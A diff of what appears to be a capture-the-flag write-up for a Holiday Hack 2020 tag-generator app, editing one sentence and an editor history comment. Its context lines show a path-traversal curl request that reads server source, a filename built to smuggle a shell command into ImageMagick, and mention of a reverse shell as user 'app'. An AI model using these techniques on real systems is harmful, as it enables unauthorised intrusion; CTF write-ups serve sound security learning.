@@ -31,7 +31,7 @@ The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../app/lib/app.rb --output app.rb
 ```
-This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
+The application code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
 Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
 ```
 jsw@io:*$ touch \'\`env\>joergen\`\;\'.jpg
@@ -68,11 +68,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyMTM4MzYyMjMsLTYxMzQ0OTY1NiwtMT
-A1MjE2MzYxNywtMTc2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMw
-NTA4NjEsMTI5MzcyMDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0ND
-E1LC02MTkyOTc0MTEsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDky
-MjE0NDM1LC0zOTg0OTE0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNz
-IsMTkzMzM2MTc4NywtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEz
-MTIwNTY0NTNdfQ==
+eyJoaXN0b3J5IjpbLTkzNTgxMzI4OCwtNjEzNDQ5NjU2LC0xMD
+UyMTYzNjE3LC0xNzYzNTQxMzU1LDE2MDczNDg1MTQsLTgyMzA1
+MDg2MSwxMjkzNzIwNDM5LDEzOTU3OTQ4MjQsLTE1OTkyNTQ0MT
+UsLTYxOTI5NzQxMSwtNTc2NjEwMDc1LDIxMDc1Mjk4NDYsOTIy
+MTQ0MzUsLTM5ODQ5MTQ2MSwxMTUxNTU2ODk2LDIzODQ2MDI3Mi
+wxOTMzMzYxNzg3LC0xNDY3NjE1MjYyLC0yNDM5NDI4NjYsMTMx
+MjA1NjQ1M119
 -->
